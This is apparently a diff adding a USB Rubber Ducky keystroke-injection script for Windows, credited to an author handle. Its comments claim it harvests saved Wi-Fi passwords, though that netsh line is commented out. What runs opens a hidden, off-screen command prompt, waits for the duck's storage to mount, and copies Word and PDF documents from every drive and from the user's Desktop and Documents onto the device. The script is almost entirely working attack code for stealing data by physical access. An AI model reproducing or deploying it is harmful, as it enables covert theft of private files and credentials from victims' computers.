@@ -1,0 +1,82 @@
+REM --> Auth- eliddell
+REM --> for use with TwinDuck on windows 7+
+REM --> This duck will take all saved wireless networks and save their info including passwords/keys, to a text file on your duck
+DEFAULT_DELAY 75
+WINDOWS d
+DELAY 10000
+GUI r
+DELAY 500
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+DELAY 500
+ENTER
+DELAY 750
+ALT SPACE
+STRING M
+DOWNARROW
+REPEAT 100
+ENTER
+DELAY 500
+ENTER
+REM Change directories because System32 appears to be protected. 
+STRING CD %TEMP%
+ENTER
+REM Make batch file that waits for SD card to mount. 
+REM Delete batch file if already exists
+STRING erase /Q DuckyWait.bat
+ENTER
+STRING copy con DuckyWait.bat
+ENTER
+REM DuckyWait.bat contents
+STRING :while1
+ENTER
+STRING for /f %%d in ('wmic volume get driveletter^, label ^| findstr "_RUBBER"') do set myd=%%d
+ENTER
+STRING if Exist %myd% (
+ENTER
+STRING goto break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+STRING goto while1
+ENTER
+STRING :break
+ENTER
+REM 
+REM once mounted switch to ducky dir for ease of dumping log to txt
+STRING %myd%
+ENTER
+DELAY 500
+REM iterate through all saved wlan profiles and print saved info for each
+REM STRING for /f "tokens=4 delims=: " %%A in ('netsh wlan show profiles') do netsh wlan show profiles name=%%A key=clear >>wlanProfiles.txt
+CONTROL z
+ENTER
+REM run duckywait
+STRING DuckyWait.bat
+ENTER
+DELAY 500
+STRING mkdir tmp
+ENTER
+STRING CD tmp
+ENTER
+STRING CLS
+ENTER                
+REM STRING for %e in (doc docx pdf) do XCOPY /s /y D:\*.%e .
+STRING for %i in (d e f g h i j k l m n o p q r s t u v w x y z) do for %e in (doc docx pdf) do if exist %i: if not "%myd%"=="%i:" (XCOPY /s /y %i:\*.%e .)
+ENTER
+STRING XCOPY /s /y "%userprofile%"\Desktop\*.doc  .
+ENTER
+STRING XCOPY /s /y "%userprofile%"\Documents\*.doc  .
+ENTER
+STRING XCOPY /s /y "%userprofile%"\Desktop\*.docx  .
+ENTER
+STRING XCOPY /s /y "%userprofile%"\Desktop\*.pdf  .
+ENTER
+STRING XCOPY /s /y "%userprofile%"\Documents\*.docx  .
+ENTER
+STRING XCOPY /s /y "%userprofile%"\Documents\*.pdf  .
+ENTER
+REM ENTER
+STRING exit
+ENTER
